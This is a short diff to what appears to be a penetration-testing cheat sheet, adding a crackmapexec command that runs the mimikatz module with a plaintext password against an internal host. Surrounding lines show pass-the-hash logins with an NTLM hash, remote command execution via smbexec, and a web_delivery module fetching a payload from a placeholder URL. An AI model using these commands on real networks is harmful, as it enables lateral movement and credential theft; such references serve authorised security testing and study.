@@ -61,6 +61,9 @@ Note: I did not author this, i found it somehwere.
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
   crackmapexec mimikatz --server http --server-port 80
+
+crackmapexec smb 10.11.1.21 -u alice -p ThisIsTheUsersPassword01 -M mimikatz
+
   ```
 
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
